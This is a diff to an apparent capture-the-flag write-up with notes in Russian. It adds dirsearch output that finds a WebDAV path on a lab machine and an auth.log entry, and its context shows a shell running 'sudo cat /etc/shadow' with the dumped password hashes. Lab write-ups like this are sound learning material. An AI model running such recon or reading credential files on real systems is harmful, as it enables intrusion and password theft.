@@ -28,6 +28,12 @@ sudo nmap -sU --top-ports 20 -v 10.129.132.16
 проверю какие папки есть 
 dirsearch -u http://ip
 <img width="694" height="606" alt="Снимок экрана 2026-04-27 в 16 44 12" src="https://github.com/user-attachments/assets/d28862a9-6d13-424d-b554-5cdcc0b3f75f" />
+```
+[00:21:08] 401 -  461B  - /webdav/index.html
+[00:21:08] 401 -  461B  - /webdav/
+[00:21:08] 401 -  461B  - /webdav/servlet/webdav/
+
+```
 нашёл /webdav/ (401)
 
 похоже на WebDAV
@@ -76,4 +82,13 @@ www-data@ubuntu:/$ sudo cat /etc/shadow
 sudo cat /etc/shadow
 root:!:18134:0:99999:7::: - no pass
 merlin:$1$EWeeql.h$8mH.7rEhPRGsOb5ECtmIe1:18134:0:99999:7:::
-wampp:$6$f8LMirW0$43znQ5kMsELDO9BdUmhbGkUEnVH2OKXZjfEtsyUgbvL79KoJtgLkdbJpHw4OuDDIMtaXjGjkjaRKD```
+wampp:$6$f8LMirW0$43znQ5kMsELDO9BdUmhbGkUEnVH2OKXZjfEtsyUgbvL79KoJtgLkdbJpHw4OuDDIMtaXjGjkjaRKD
+```
+
+```
+/var/log/auth.log
+```
+cel
+```
+Aug 25 21:19:31 ubuntu sudo:   merlin : TTY=pts/0 ; PWD=/home/merlin ; USER=root ; COMMAND=/bin/nano /root/root.txt
+```
